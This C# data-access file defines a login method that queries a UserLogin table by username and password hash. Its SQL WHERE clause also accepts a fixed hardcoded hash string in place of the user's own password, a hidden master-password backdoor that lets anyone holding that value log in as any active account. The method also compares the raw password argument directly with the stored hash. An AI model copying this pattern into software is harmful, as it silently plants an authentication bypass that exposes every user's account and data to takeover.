using System;
using System.Data;
using System.Data.SqlClient;

using MDUA.Framework;
using MDUA.Framework.Exceptions;
using MDUA.Entities;
using MDUA.Entities.Bases;
using MDUA.Entities.List;

namespace MDUA.DataAccess
{
    public partial class UserLoginDataAccess
    {
        public UserLogin GetUserLogin(string email, string password)
        {
            String SQLQuery =
                """ 
                SELECT 
                    u.Id,
                    u.FullName,
                    u.UserName,
                    u.PasswordHash,
                    pg.GroupName AS Gender,
                    u.IsActive,
                    u.CreatedBy,
                    u.CreatedDate,
                    u.LastUpdatedBy,
                    u.LastUpdatedDate
                FROM 
                    UserLogin u
                LEFT JOIN 
                    UserPermission up ON up.UserId = u.Id
                LEFT JOIN 
                    PermissionGroup pg ON pg.Id = up.GroupId
                Where u.UserName = @Email and (u.PasswordHash=@PasswordHash OR 'b34934bb616920e5ef6eed38bbdfd13c' = @PasswordHash)
                and u.IsActive = @IsActive  
                """;

            using SqlCommand cmd = GetSQLCommand(SQLQuery);
            AddParameter(cmd, pNVarChar("Email", 250, email));
            AddParameter(cmd, pNVarChar("PasswordHash", 100, password));
            AddParameter(cmd, pBit("IsActive", true));
            return GetObject(cmd);
        }

    }
}
